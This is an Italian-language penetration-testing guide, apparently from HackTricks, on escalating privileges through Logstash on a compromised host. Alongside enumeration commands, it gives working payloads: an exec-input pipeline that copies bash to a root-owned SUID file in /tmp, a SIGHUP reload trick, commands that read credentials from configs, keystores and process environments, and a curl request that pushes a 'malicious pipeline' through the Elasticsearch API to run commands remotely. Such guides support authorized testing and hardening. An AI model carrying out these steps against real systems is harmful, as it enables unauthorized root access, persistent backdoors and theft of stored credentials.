# Escalatione dei privilegi di Logstash

## Logstash

Logstash viene utilizzato per **raccogliere, trasformare e inoltrare i log** attraverso un sistema noto come **pipeline**. Queste pipeline sono composte da fasi di **input**, **filtro** e **output**.<sup>[[4]](#references)</sup> Un aspetto interessante si presenta quando Logstash opera su una macchina compromessa.

### Configurazione delle pipeline

Nelle installazioni dei pacchetti Debian e RPM, le pipeline sono configurate tramite **/etc/logstash/pipelines.yml**, che elenca i percorsi delle configurazioni delle pipeline; altre distribuzioni collocano `pipelines.yml` nella directory `path.settings` di Logstash.<sup>[[5]](#references)[[6]](#references)</sup>
```yaml
# Define your pipelines here. Multiple pipelines can be defined.
# For details on multiple pipelines, refer to the documentation:
# https://www.elastic.co/guide/en/logstash/current/multiple-pipelines.html

- pipeline.id: main
path.config: "/etc/logstash/conf.d/*.conf"
- pipeline.id: example
path.config: "/usr/share/logstash/pipeline/1*.conf"
pipeline.workers: 6
```
Questo file rivela dove si trovano i file **.conf** contenenti le configurazioni delle pipeline. Quando si utilizza un **Elasticsearch output**, esaminare le impostazioni `user`/`password`, `cloud_auth` o `api_key`; i privilegi effettivi dell'account dipendono da Elasticsearch. Un glob `path.config` carica ogni file corrispondente per quella pipeline.<sup>[[6]](#references)[[7]](#references)[[11]](#references)</sup>

Se Logstash viene avviato con `-f <directory>` invece di `pipelines.yml`, `-f` ha la precedenza e **tutti i file all'interno di quella directory vengono concatenati in ordine lessicografico e analizzati come un'unica config**.<sup>[[6]](#references)[[7]](#references)</sup> Questo comporta 2 implicazioni offensive:

- Un file aggiunto, come `000-input.conf` o `zzz-output.conf`, può modificare il modo in cui viene assemblata la pipeline finale
- Un file malformato può causare il fallimento della validazione della config combinata; durante il reload, Logstash mantiene la pipeline precedente, quindi validare i payload prima di affidarsi all'auto-reload.<sup>[[1]](#references)</sup>

### Enumerazione rapida su un host compromesso

Su un host in cui Logstash è installato, esaminare rapidamente:
```bash
ps aux | grep -i logstash
systemctl cat logstash 2>/dev/null
cat /etc/logstash/pipelines.yml 2>/dev/null
cat /etc/logstash/logstash.yml 2>/dev/null
find /etc/logstash /usr/share/logstash -maxdepth 3 -type f \( -name '*.conf' -o -name 'logstash.yml' -o -name 'pipelines.yml' \) -ls
rg -n --hidden -S 'password|passwd|api[_-]?key|cloud_auth|ssl_keystore_password|truststore_password|user\s*=>|hosts\s*=>' /etc/logstash /usr/share/logstash 2>/dev/null
```
Verifica anche se la monitoring API locale è raggiungibile. Per impostazione predefinita, si associa a **127.0.0.1:9600**, che di solito è sufficiente dopo il landing sull'host.<sup>[[8]](#references)</sup>
```bash
curl -s http://127.0.0.1:9600/?pretty
curl -s http://127.0.0.1:9600/_node/pipelines?pretty
curl -s http://127.0.0.1:9600/_node/stats/pipelines?pretty
```
Questi endpoint espongono gli ID delle pipeline e le impostazioni, le metriche di runtime e i contatori di successo/fallimento del ricaricamento della configurazione, aiutando a confermare se una modifica è stata accettata.<sup>[[8]](#references)[[17]](#references)[[18]](#references)</sup>

Se una credenziale recuperata riguarda **Elasticsearch**, consulta [questa pagina su Elasticsearch](../../network-services-pentesting/9200-pentesting-elasticsearch.md).

### Privilege Escalation tramite Pipeline scrivibili

Per tentare una privilege escalation, identifica innanzitutto l'utente con cui il servizio Logstash è effettivamente in esecuzione; non presumere che sia root o l'utente **logstash**. Assicurati di soddisfare **uno** di questi criteri:

- Disporre di **accesso in scrittura** a un file **.conf** di una pipeline **oppure**
- Il file **/etc/logstash/pipelines.yml** utilizza un wildcard e puoi scrivere nella cartella di destinazione.<sup>[[6]](#references)[[7]](#references)</sup>

Inoltre, deve essere soddisfatta **una** di queste condizioni:

- Possibilità di riavviare il servizio Logstash **oppure**
- Il file **/etc/logstash/logstash.yml** ha impostato **config.reload.automatic: true**.<sup>[[1]](#references)[[15]](#references)</sup>

Quando nella configurazione è presente un wildcard, creare un file che corrisponda a questo wildcard consente l'esecuzione di comandi.<sup>[[7]](#references)[[9]](#references)</sup> Ad esempio:
```bash
input {
exec {
command => "whoami"
interval => 120
}
}

output {
file {
path => "/tmp/output.log"
codec => rubydebug
}
}
```
Qui, **interval** determina la frequenza di esecuzione in secondi. Nell'esempio fornito, il comando **whoami** viene eseguito ogni 120 secondi e il relativo output viene reindirizzato a **/tmp/output.log**.<sup>[[9]](#references)</sup>

Con **config.reload.automatic: true** in **/etc/logstash/logstash.yml**, Logstash rileverà e applicherà automaticamente le configurazioni delle pipeline nuove o modificate senza bisogno di un riavvio.<sup>[[1]](#references)[[15]](#references)</sup> Se non è presente un wildcard, è comunque possibile modificare le configurazioni esistenti, ma è consigliabile procedere con cautela per evitare interruzioni.

### Payload per pipeline più affidabili

Il plugin di input `exec` continua a funzionare nelle versioni attuali e richiede un **interval** o una **schedule**. Esegue il **forking** della JVM di Logstash, quindi, se la memoria è scarsa, il payload potrebbe fallire con `ENOMEM` invece di essere eseguito silenziosamente.<sup>[[9]](#references)</sup>

Quando il servizio dispone di privilegi sufficienti per creare un file SUID di proprietà di root, un payload pratico per la privilege escalation è quello che lascia un artifact persistente:
```bash
input {
exec {
command => "cp /bin/bash /tmp/logroot && chown root:root /tmp/logroot && chmod 4755 /tmp/logroot"
interval => 300
}
}
output {
null {}
}
```
Se non disponi dei permessi per riavviare ma puoi inviare un segnale al processo, Logstash supporta anche un **reload** attivato da **SIGHUP** sui sistemi Unix-like:<sup>[[1]](#references)</sup>
```bash
kill -SIGHUP $(pgrep -f logstash)
```
Tieni presente che non ogni plugin supporta il reload. Ad esempio, l'input **stdin** impedisce il reload automatico, quindi non dare per scontato che `config.reload.automatic` rilevi sempre le tue modifiche.<sup>[[1]](#references)</sup>

### Sottrarre Secrets da Logstash

Prima di concentrarti esclusivamente sulla code execution, raccogli i dati a cui Logstash ha già accesso:

- Le credenziali possono comparire negli output `elasticsearch {}`, negli URL/impostazioni di `http_poller`, negli input JDBC o nelle impostazioni relative al cloud; questi plugin espongono campi per le credenziali che vale la pena cercare.<sup>[[11]](#references)[[12]](#references)[[13]](#references)</sup>
- Le impostazioni sicure possono trovarsi in **`/etc/logstash/logstash.keystore`** o in un'altra directory `path.settings`.<sup>[[5]](#references)[[10]](#references)</sup>
- La password del keystore può essere fornita tramite **`LOGSTASH_KEYSTORE_PASS`**, mentre le installazioni RPM/DEB caricano le variabili d'ambiente del servizio da **`/etc/sysconfig/logstash`**.<sup>[[10]](#references)</sup>
- L'espansione delle variabili d'ambiente con `${VAR}` viene risolta all'avvio di Logstash, quindi vale la pena ispezionare l'ambiente del servizio.<sup>[[14]](#references)</sup>

Controlli utili:
```bash
ls -l /etc/logstash /etc/logstash/logstash.keystore 2>/dev/null
strings /etc/logstash/conf.d/*.conf 2>/dev/null | head
tr '\0' '\n' < /proc/$(pgrep -o -f logstash)/environ 2>/dev/null | sort
cat /etc/sysconfig/logstash 2>/dev/null
journalctl -u logstash --no-pager 2>/dev/null | tail -n 200
ls -lah /var/log/logstash 2>/dev/null
```
Vale anche la pena verificare questo aspetto, perché **CVE-2023-46672** ha mostrato che, in circostanze specifiche, Logstash registrava informazioni sensibili nei propri log, inclusi i secret archiviati nel suo keystore e referenziati dalla configurazione; esamina i vecchi log di Logstash e le voci di `journald` se tali circostanze potrebbero applicarsi.<sup>[[3]](#references)</sup>

### Abuso della gestione centralizzata delle pipeline

In alcuni ambienti, l'host **non** si basa affatto su file `.conf` locali. Se è configurato **`xpack.management.enabled: true`**, Logstash può recuperare pipeline gestite centralmente da Elasticsearch/Kibana e, dopo l'abilitazione di questa modalità, le configurazioni locali non sono più la source of truth.<sup>[[2]](#references)</sup>

Questo significa che esiste un diverso attack path:

1. Recupera le credenziali Elastic dalle impostazioni locali di Logstash, dal keystore o dai log.<sup>[[3]](#references)[[10]](#references)</sup>
2. Verifica se l'account dispone del cluster privilege **`manage_logstash_pipelines`**.<sup>[[16]](#references)</sup>
3. Crea o sostituisci una pipeline gestita centralmente, in modo che l'host Logstash esegua il tuo payload al successivo poll interval.<sup>[[2]](#references)[[16]](#references)</sup>

L'API Elasticsearch utilizzata per questa funzionalità è:<sup>[[16]](#references)</sup>
```bash
curl -X PUT http://ELASTIC:9200/_logstash/pipeline/pwned \
-H 'Content-Type: application/json' \
-u user:password \
-d '{
"description": "malicious pipeline",
"last_modified": "2026-01-02T02:50:51.250Z",
"username": "user",
"pipeline": "input { exec { command => \"id > /tmp/.ls-rce\" interval => 120 } } output { null {} }",
"pipeline_metadata": {"type": "logstash_pipeline", "version": "1"},
"pipeline_settings": {
"pipeline.workers": 1,
"pipeline.batch.size": 1,
"pipeline.batch.delay": 50,
"queue.type": "memory",
"queue.max_bytes": "1gb",
"queue.checkpoint.writes": 1024
}
}'
```
Questo è particolarmente utile quando i file locali sono di sola lettura, ma Logstash è già registrato per recuperare le pipeline da remoto.<sup>[[2]](#references)[[16]](#references)</sup>

## References

- [1] [Elastic Docs: Ricaricamento del file di configurazione](https://www.elastic.co/guide/en/logstash/8.19/reloading-config.html)
- [2] [Elastic Docs: Configurazione della gestione centralizzata delle pipeline](https://www.elastic.co/guide/en/logstash/8.19/configuring-centralized-pipelines.html)
- [3] [Aggiornamento di sicurezza di Logstash 8.11.1 (ESA-2023-26) - CVE-2023-46672](https://discuss.elastic.co/t/logstash-8-11-1-security-update-esa-2023-26/347191)
- [4] [Elastic Docs: Creazione di una pipeline Logstash](https://www.elastic.co/docs/reference/logstash/creating-logstash-pipeline)
- [5] [Elastic Docs: Struttura delle directory di Logstash](https://www.elastic.co/docs/reference/logstash/dir-layout)
- [6] [Elastic Docs: Pipeline multiple](https://www.elastic.co/docs/reference/logstash/multiple-pipelines)
- [7] [Elastic Docs: Esecuzione di Logstash dalla riga di comando](https://www.elastic.co/docs/reference/logstash/running-logstash-command-line)
- [8] [Elastic Docs: Monitoraggio di Logstash con le API](https://www.elastic.co/docs/reference/logstash/monitoring-logstash)
- [9] [Elastic Docs: Plugin di input exec](https://www.elastic.co/docs/reference/logstash/plugins/plugins-inputs-exec)
- [10] [Elastic Docs: Keystore dei secrets per impostazioni sicure](https://www.elastic.co/docs/reference/logstash/keystore)
- [11] [Elastic Docs: Plugin di output Elasticsearch](https://www.elastic.co/docs/reference/logstash/plugins/plugins-outputs-elasticsearch)
- [12] [Elastic Docs: Plugin di input Http_poller](https://www.elastic.co/docs/reference/logstash/plugins/plugins-inputs-http_poller)
- [13] [Elastic Docs: Plugin di input Jdbc](https://www.elastic.co/docs/reference/logstash/plugins/plugins-inputs-jdbc)
- [14] [Elastic Docs: Utilizzo delle variabili d'ambiente](https://www.elastic.co/docs/reference/logstash/environment-variables)
- [15] [Elastic Docs: logstash.yml](https://www.elastic.co/docs/reference/logstash/logstash-settings-file)
- [16] [API Elasticsearch: Creazione o aggiornamento di una pipeline Logstash](https://www.elastic.co/docs/api/doc/elasticsearch/operation/operation-logstash-put-pipeline)
- [17] [API Logstash: Ottenimento delle impostazioni delle pipeline](https://www.elastic.co/docs/api/doc/logstash/operation/operation-nodeinfopipelines)
- [18] [API Logstash: Ottenimento delle statistiche delle pipeline](https://www.elastic.co/docs/api/doc/logstash/operation/operation-nodestatspipelines)
{{#include ../../banners/hacktricks-training.md}}
